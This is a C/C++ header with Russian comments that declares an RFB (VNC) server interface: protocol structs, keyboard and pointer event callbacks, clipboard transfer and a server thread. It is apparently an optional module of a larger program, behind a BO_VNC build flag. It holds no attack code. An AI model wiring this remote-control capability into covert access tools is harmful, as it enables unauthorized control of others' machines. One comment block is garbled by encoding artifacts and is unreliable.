/*
  Протокол RFB.
  На основе http://www.uvnc.com/

*/
#pragma once

#if(BO_VNC > 0)
namespace Rfb
{
  //Types of authorization.
  enum
  {
    ST_INVALID = 0,
    ST_NONE    = 1,
    ST_VNCAUTH = 2,
    ST_ERROR   = 0xFFFFFFFF
  };

  //Types of codecs.
  enum  
  {
    ENCODER_Raw         = 0, 
    ENCODER_Hextile     = 5,
    ENCODER_DesktopSize = 0xFFFFFF21
  };

  #pragma pack(push, 1)
  //Pixel format.
  typedef struct
  {
    BYTE bBitsPerPixel;
    BYTE bDepth;
    BYTE bBigEndian;
    BYTE bTrueColour;
    
    WORD wRedMax;
    WORD wGreenMax;
    WORD wBlueMax;
    
    BYTE bRedShift;
    BYTE bGreenShift;
    BYTE bBlueShift;
    
    BYTE bPadding[3];
  }PIXEL_FORMAT;

  //Post ServerInit.
  typedef struct
  {
    WORD wFrameBufferWidth;
    WORD wFrameBufferHeight;
    PIXEL_FORMAT pf;
    DWORD dwNameLength;
  }MSG_SERVERINIT;

  //The coordinates of the square.
  typedef struct
  {
    BYTE bIncremental;
    WORD wXPos;
    WORD wYPos;
    WORD wWidth;
    WORD wHeight;
  }RECTANGLE;

  typedef struct
  {
    WORD wXPos;
    WORD wYPos;
    WORD wWidth;
    WORD wHeight;
    DWORD dwEncodingType;
  }RECTANGLEEX;
  
  //Data on the key.
  typedef struct
  {
    BYTE bIsDown;
    BYTE pad[2];
    DWORD dwKeyCode;
  }EVENT_KEY;
  
  //Data on the signs.
  typedef struct
  {
    BYTE bButtonMask;
    WORD wXPos;
    WORD wYPos;
  }EVENT_POINTER;
  #pragma pack(pop)

  //Inside the server data.
  typedef struct
  {
    HDC memoryDc;           //DC for work.
    HBITMAP originalBitmap; //Outcomes bitmap memoryDc.

    WORD wWidth;
    WORD wHeight;
    DWORD dwWidthInBytes;

    HBITMAP hBitmap;
    LPBYTE pBmpDIB;
    LPBYTE pBmpDIBOld;
    void *pHextileBuffer; //Internal buffer for the codec Hextile.
    
    PIXEL_FORMAT pfLocalPixel;
    BYTE bLocalPixelSize;
    PIXEL_FORMAT pfRemotePixel;
    BYTE bRemotePixelSize;

    LPDWORD dwEncodingsList;       //List of codecs that are supported by client
    WORD wEncodingsCount;          //Number of codecs that are supported by client
    DWORD dwCurrentEncoder;        //Tekuschmy codec.
    DWORD dwCurrentEncoderSwapped; //BigEndian Id codec.
  }INTERNAL_DATA;

  //Structure with kelbek functions used in the course of the server.
  //NOTE: All WORD, DWORD specified in LITTLE ENDIAN (ie normal).
  typedef struct 
  {
    void *param; //Arbitrary parameter functions.

    /*
      Установка способа авторизации на сервере.

      OUT securityType - одно из значений ST_*. По умолчанию значение равно ST_NONE.
      OUT errorMessage - в случаи если *pdwSecurityType == ST_INVALID, указывается сообщение
                         об ошибки, инача игнарируется. Содержимое *ppstrErrorMessage не будет
                         автоматически освобождено!
    */
    void (*onSecurityType)(void *param, LPDWORD securityType, LPSTR *errorMessage);
    
    /*
      Получение от клиента сообщения ClientInit.

      IN shared - состояние флага Shared-flag.

      Return    - true - для продолжения работы,
                  false - для корректного заверешния работы.
    */
    bool (*onClientInit)(void *param, BYTE shared);
    
    /*
      Вызывается перед отправкой сообщения ServerInit.

      OUT name - указатель на имя сервера. Буфер не освождается автоматически!
      OUT size - размер изоброжения.

      Return   - Memory DC - будет использоватся для работы сервера, будет освобожден
                 самостоятельно.
                 NULL - для корректного заверешния работы. 
   */
    HDC (*onServerInit)(void *param, LPSTR *name, POINT *size);

    /*
      Подготовка к поиску обноволений изображения.
    */
    void (*OnUpdateDC)(void *pParam);

    /*
      Изменение состояние клавиши.

      IN keySym - KeySym.
      IN down   - true - нажатие, false - отпсукание.
    */
    void (*onKeyEvent)(void *param, DWORD keySym, bool down);
    
    /*
      Изменение состояния указателя.

      IN ..       - полный аналог mouse_event.
    */
    void (*OnPointerEvent)(void *pParam, DWORD dwFlags, LONG wX, LONG wY, DWORD dwData);

    /*
      Вставка текста.
      
      IN dwLen      - размер текста.
      IN pstrString - строка.
    */
    void (*OnClientCutText)(void *pParam, DWORD dwLen, LPSTR pstrString);
  }SERVER_CALLBACKS;
  
  /*
    Инициализация.
  */
  void init(void);

  /*
    Деинициализация.
  */
  void uninit(void);

  /*
    Запуск RFB пртокола.

    IN s                 - сокет.
    IN dwTimeout         - таймаут ожидание ответов от клиента, или 0 для бесконечного ожидания.
    IN pCallbacks        - список кээлбэк функций.
    IN hDIBMap           - Map-file для битмапа, изменения которого будут проверяться, или NULL.
    IN updateMutex       - мютекс блокировки обнволений битмапа, или NULL.
    IN dwRefreshInterval - задержка между поиском изменений изображения.
  */
  void _ServerThread(SOCKET s, DWORD dwTimeout, SERVER_CALLBACKS *pCallbacks, HANDLE hDIBMap, DWORD mapOffset, HANDLE updateMutex, DWORD dwRefreshInterval);

  /*
    Проиграть звуковой сигнал на клиенте.

    IN s   - сокет клиента.

    Return - true - в случаи успеха,
             false - в случаи ошибки.
  */
  bool _SendBell(SOCKET s);
  
  /*В В В В Send a "buffer" the text to the client.
В В В В 
В В В В IN s - the client socket.
В В В В IN pstrText - text to send.

В В В В Return - true - if successful,
В В В В В В В В В В В В В false - if an error occurs.
В В */
  bool _CopyText(SOCKET s, LPSTR pstrText);
};

#endif
